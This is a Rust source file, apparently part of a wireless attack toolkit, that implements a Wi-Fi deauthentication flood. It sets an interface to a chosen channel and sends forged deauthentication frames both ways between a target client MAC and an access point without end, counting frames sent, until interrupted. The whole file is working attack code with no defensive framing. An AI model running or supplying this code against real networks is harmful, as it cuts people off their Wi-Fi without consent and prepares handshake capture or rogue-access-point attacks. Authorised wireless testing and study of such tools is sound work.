use std::{thread, time::Duration};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use crate::engines::DeauthArgs;
use crate::addrs::{Mac, Bssid};
use crate::iface::IfaceManager;
use crate::builders::Frames;
use crate::sockets::Layer2Socket;
use crate::utils::{ CtrlCHandler, inline_display, abort };




pub struct Deauthentication {
    builder    : Frames,
    frms_sent  : usize,
    seq_num    : u16,
    socket     : Layer2Socket,
    iface      : String,
    channel    : i32,
    bssid      : Bssid,
    target_mac : Mac,
    delay      : u64
}


impl Deauthentication {

    pub fn new(args: DeauthArgs) -> Self {
        Self { 
            builder    : Frames::new(),
            frms_sent  : 0,
            seq_num    : 1,
            socket     : Layer2Socket::new(&args.iface),
            iface      : args.iface,
            channel    : args.channel,
            bssid      : args.bssid,
            target_mac : args.target_mac,
            delay      : args.delay,
        }
    }



    pub fn execute(&mut self) {
        self.set_channel();
        self.display_exec_info();
        self.send_endlessly();
    }



    fn set_channel(&self) {
        if !IfaceManager::set_channel(&self.iface, self.channel) {
            abort(
                format!(
                    "Uneable to set channel {} on interface {}", 
                    self.iface, self.channel
                )
            )
        }
    }



    fn display_exec_info(&self) {
        println!("BSSID...: {}", self.bssid.to_string());
        println!("TARGET..: {}", self.target_mac.to_string());
        println!("CHANNEL.: {}", self.channel);
    }



    fn send_endlessly(&mut self) {
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());
        
        while running.load(Ordering::SeqCst) {
            let target = *self.target_mac.bytes();
            let bssid  = *self.bssid.bytes();
        
            self.send_frame(&target, &bssid);
            self.send_frame(&bssid, &target);
        }
    
        println!("\nFlood interrupted");
    }



    #[inline]
    fn send_frame(
        &mut self, 
        src_mac : &[u8; 6], 
        dst_mac : &[u8; 6], 
    ) {
        let frame = self.builder.deauth(dst_mac, src_mac, self.bssid, self.seq_num);
        
        self.socket.send(frame);
        self.update_seq_num();
        self.frms_sent += 1;

        inline_display(&format!("Frames sent: {}", &self.frms_sent));
        thread::sleep(Duration::from_millis(self.delay));
    }



    #[inline]
    fn update_seq_num(&mut self) {
        if self.seq_num >= 4095 {
            self.seq_num = 0;
        }

        self.seq_num += 1;
    }

}



impl crate::EngineTrait for Deauthentication {
    type Args = DeauthArgs;
    
    fn new(args: Self::Args) -> Self {
        Deauthentication::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}